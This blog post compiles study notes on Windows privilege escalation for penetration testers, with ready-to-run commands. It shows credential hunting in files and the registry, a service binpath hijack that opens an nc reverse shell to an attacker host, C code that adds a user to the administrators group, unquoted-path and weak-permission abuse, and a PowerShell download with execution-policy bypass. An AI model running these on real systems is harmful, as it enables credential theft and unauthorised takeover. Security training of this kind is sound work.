---
layout: post
title:  "Windows Privilege Escalation"
date:   2018-11-08 10:00:00 +1100
categories: [windows, security, privilege-escalation]
permalink: /:title:output_ext
comments: true
---
<br>
-- The following guide is based on the numerous resources I found from other OSCP reviews and just googling it.<br>
-- It's just a compilation of other peoples work and I have used the links from which I made my notes.<br>

http://www.fuzzysecurity.com/tutorials/16.html<br>
https://toshellandback.com/2015/11/24/ms-priv-esc/<br>
https://github.com/pentestmonkey/windows-privesc-check<br>
https://blog.gdssecurity.com/labs/2014/7/11/introducing-windows-exploit-suggester.html<br>
https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/<br>
https://github.com/foxglovesec/RottenPotato<br>
http://www.exumbraops.com/penetration-testing-102-windows-privilege-escalation-cheatsheet/<br>
https://www.youtube.com/watch?v=PC_iMqiuIRQ<br>
https://www.youtube.com/watch?v=kMG8IsCohHA&feature=youtu.be<br>
https://www.youtube.com/watch?v=kMG8IsCohHA&feature=youtu.be<br>
https://github.com/PowerShellMafia/PowerSploit<br>
http://www.blackhillsinfosec.com/?p=5824<br>
https://www.commonexploits.com/unquoted-service-paths/<br>
https://github.com/abatchy17/WindowsExploits<br>
https://github.com/sheimo/oscp/blob/master/windows-template.md<br>

**[Awesome Windows Post Exploitation](https://github.com/emilyanncr/Windows-Post-Exploitation)**
<br>
**[BeRoot Project](https://github.com/AlessandroZ/BeRoot)**

###############################################################

**Basic Enumeration of the System**

Before we start looking for privilege escalation opportunities we need to understand a bit about the machine. We need to know what users have privileges. What patches/hotfixes the system has.

**Basics**

    systeminfo
    hostname

**Who am I?**
    
    whoami
    echo %username%

**What users/localgroups are on the machine?**
    
    net users
    net localgroups

**More info about a specific user. Check if user has privileges.**
    
    net user user1

**View Domain Groups**
    
    net group /domain

**View Members of Domain Group**

    net group /domain <Group Name>

**Firewall**

    netsh firewall show state
    netsh firewall show config

**Network**

    ipconfig /all
    route print
    arp -A

**How well patched is the system?**

    wmic qfe get Caption,Description,HotFixID,InstalledOn
    wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.." - to find specific KBs

**Cleartext Passwords**

    findstr /si password *.txt
    findstr /si password *.xml
    findstr /si password *.ini

**Find all those strings in config files.**
    
    dir /s *pass* == *cred* == *vnc* == *.config*

**Find all passwords in all files.**

	findstr /spin "password" *.*
	findstr /spin "password" *.*
	
	type C:\sysprep.inf
	type C:\sysprep\sysprep.xml

**These are common files to find them in. They might be base64-encoded. So look out for that.**
	
    c:\sysprep.inf
	c:\sysprep\sysprep.xml
	c:\unattend.xml
	%WINDIR%\Panther\Unattend\Unattended.xml
	%WINDIR%\Panther\Unattended.xml

	dir c:\*vnc.ini /s /b
	dir c:\*ultravnc.ini /s /b 
	dir c:\ /s /b | findstr /si *vnc.ini


**In Registry**

	# VNC
	reg query "HKCU\Software\ORL\WinVNC3\Password"

	# Windows autologin
	reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

	# SNMP Paramters
	reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

	# Putty
	reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

	# Search for password in registry
	reg query HKLM /f password /t REG_SZ /s
	reg query HKCU /f password /t REG_SZ /s
	

**Running Services:**
	
    netstat -ano
	
**Port forward using plink**

    plink.exe -l root -pw mysecretpassword 192.168.x.x -R 8080:127.0.0.1:8080

**Port forward using meterpreter**

    portfwd add -l <attacker port> -p <victim port> -r <victim ip>
    portfwd add -l 3306 -p 3306 -r 192.168.x.x


**Kernel exploits**
Kernel exploits should be our last resource, since it might but the machine in an unstable state or create some other problem with the machine.

**Identify the hotfixes/patches**
    
    systeminfo
**or**
    
    wmic qfe get Caption,Description,HotFixID,InstalledOn

**Python to Binary**
If we have an exploit written in python but we don't have python installed on the victim-machine we can always transform it into a binary with pyinstaller. 

**Scheduled Tasks**
Here we are looking for tasks that are run by a privileged user, and run a binary that we can overwrite.

    schtasks /query /fo LIST /v

This might produce a huge amount of text. I have not been able to figure out how to just output the relevant strings with findstr. So if you know a better way please notify me. As for now I just copy-paste the text and past it into my linux-terminal.

Yeah I know this ain't pretty, but it works. You can of course change the name SYSTEM to another privileged user.

cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM

**Change the upnp service binary**

    sc config upnphost binpath= "C:\Inetpub\nc.exe attacker-IP 8888 -e c:\Windows\system32\cmd.exe"
    sc config upnphost obj= ".\LocalSystem" password= ""
    sc config upnphost depend= ""


**Weak Service Permissions**
Services on windows are programs that run in the background. Without a GUI.

If you find a service that has write permissions set to everyone you can change that binary into your custom binary and make it execute in the privileged context.

First we need to find services. That can be done using wmci or sc.exe. Wmci is not available on all windows machines, and it might not be available to your user. If you don't have access to it, you can use sc.exe.

**WMIC**
    
    wmic service list brief

This will produce a lot out output and we need to know which one of all of these services have weak permissions. In order to check that we can use the icacls program. Notice that icacls is only available from Vista and up. XP and lower has cacls instead.

As you can see in the command below you need to make sure that you have access to wimc, icacls and write privilege in C:\windows\temp.

    for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt

    for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"

Binaries in system32 are excluded since they are mostly correct, since they are installed by windows.

    sc.exe
    sc query state= all | findstr "SERVICE_NAME:" >> Servicenames.txt

    FOR /F %i in (Servicenames.txt) DO echo %i
    type Servicenames.txt

    FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt
    FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt

Now you can process them one by one with the cacls command.

    cacls "C:\path\to\file.exe"


#### Look for Weakness

What we are interested in is binaries that have been installed by the user. In the output you want to look for BUILTIN\Users:(F). Or where your user/usergroup has (F) or (C) rights.

Example:

    C:\path\to\file.exe 
    BUILTIN\Users:F
    BUILTIN\Power Users:C 
    BUILTIN\Administrators:F 
    NT AUTHORITY\SYSTEM:F

That means your user has write access. So you can just rename the .exe file and then add your own malicious binary. And then restart the program and your binary will be executed instead. This can be a simple getsuid program or a reverse shell that you create with msfvenom.

**Here is a POC code for getsuid.**

    #include <stdlib.h>
    int main ()
    {
    int i;
        i = system("net localgroup administrators theusername /add");
    return 0;
    }

**We then compile it with mingw like this:**

    i686-w64-mingw32-gcc windows-exp.c -lws2_32 -o exp.exe

**Restart the Service**

Okay, so now that we have a malicious binary in place we need to restart the service so that it gets executed. We can do this by using wmic or net the following way:

    wmic service NAMEOFSERVICE call startservice
    net stop [service name] && net start [service name].

The binary should now be executed in the SYSTEM or Administrator context.



### Unquoted Service Paths

Find Services With Unquoted Paths

#### Using WMIC
    wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """

#### Using sc
    sc query
    sc qc service name

**Look for Binary_path_name and see if it is unquoted.**

If the path contains a space and is not quoted, the service is vulnerable.

**Exploit It**
If the path to the binary is:

    c:\Program Files\something\winamp.exe

We can place a binary like this

    c:\program.exe


**AlwaysInstallElevated**

    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

**Group Policy Preference**

If the machine belongs to a domain and your user has access to System Volume Information there might be some sensitive files there.

First we need to map/mount that drive. In order to do that we need to know the IP-address of the domain controller. We can just look in the environment-variables

**Output environment-variables**
<code>set</code>

**Look for the following:**
<code>LOGONSERVER=\\NAMEOFSERVER</code>
<code>USERDNSDOMAIN=WHATEVER.LOCAL</code>

**Look up ip-addres**
<code>nslookup nameofserver.whatever.local</code>

It will output something like this
<code>Address:  192.168.x.x</code>

Now we mount it
<code>net use z: \\192.168.x.x\SYSVOL</code>

And enter it
<code>z:</code>

#### Now we search for the groups.xml file
<code>dir Groups.xml /s</code>

If we find the file with a password in it, we can decrypt it like this in Kali
<code>gpp-decrypt encryptedpassword</code>

<br>
#### On Windows XP and Older

If you have a GUI with a user that is included in Administrators group you first need to open up cmd.exe for the administrator. If you open up the cmd that is in Accessories it will be opened up as a normal user. And if you rightclick and do Run as Administrator you might need to know the Administrators password. Which you might not know. So instead you open up the cmd from <code>c:\windows\system32\cmd.exe</code>. This will give you a cmd with Administrators rights.

From here we want to become SYSTEM user. To do this we run:

First we check what time it is on the local machine:
<code>time</code>

Now we set the time we want the system CMD to start. Probably one minuter after the time.
<code>at 01:23 /interactive cmd.exe</code>

And then the **cmd** with SYSTEM privs pops up.

**Vista and Newer**

You first need to upload **PsExec.exe** and then you run:
<code>psexec -i -s cmd.exe</code>

**Kitrap**

On some machines the at 20:20 trick does not work. It never works on Windows 2003 for example. Instead you can use Kitrap. Upload both files and execute vdmaillowed.exe. I think it only works with GUI.

<code>vdmallowed.exe
vdmexploit.dll</code>

<br>
#### Using Metasploit

So if you have a metasploit meterpreter session going you can run getsystem.
Post modules

Some interesting metasploit post-modules

First you need to background the meterpreter shell and then you just run the post modules.
You can also try some different post modules.

```
use exploit/windows/local/service_permissions
post/windows/gather/credentials/gpp
run post/windows/gather/credential_collector 
run post/multi/recon/local_exploit_suggester
run post/windows/gather/enum_shares
run post/windows/gather/enum_snmp
run post/windows/gather/enum_applications
run post/windows/gather/enum_logged_on_users
run post/windows/gather/checkvm
```

-- PsExec
https://pen-testing.sans.org/blog/2013/03/27/psexec-python-rocks

<br>
#### Post Exploit Enum Scripts:

[JAWS](https://github.com/411Hall/JAWS) - Just Another Windows (Enum) Script

Usage:

Run from within CMD shell and write out to file.

    powershell -exec bypass -c (new-object System.Net.WebClient).DownloadFile('http://10.10.15.24/jaws.ps1','C:\Windows\temp\jaws.ps1')
    CMD C:\Windows\temp> powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt

Run from within CMD shell and write out to screen.

    CMD C:\temp> powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1

Run from within PS Shell and write out to file.

    PS C:\temp> .\jaws-enum.ps1 -OutputFileName Jaws-Enum.txt


[WinPrivCheck by ihack4falafel](https://github.com/ihack4falafel/OSCP/blob/master/Windows/WinPrivCheck.bat)

[Sherlock](https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1)
-- New one is Watson

[PentestMonkey](https://github.com/pentestmonkey/windows-privesc-check)
Windows-privesc-check is standalone executable that runs on Windows systems. It tries to find misconfigurations that could allow local unprivileged users to escalate privileges to other users or to access local apps (e.g. databases).

[Exploit Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)
For this one, we need to grab the output of systeminfo and then run it against the script.
\-- Update the database: <code>./windows-exploit-suggester.py --update</code><br>
<code>./windows-exploit-suggester.py --database 2018-10-28-mssb.xlsx --systeminfo winsysinfo.txt</code><br>
**OR**<br>
\-- If we only know about the Operating System name and not much about the hot-fixes, then possible exploits for an operating system can be used without hotfix data
<code>./windows-exploit-suggester.py --database 2018-10-28-mssb.xlsx --ostext 'windows server 2008 r2'</code><br>
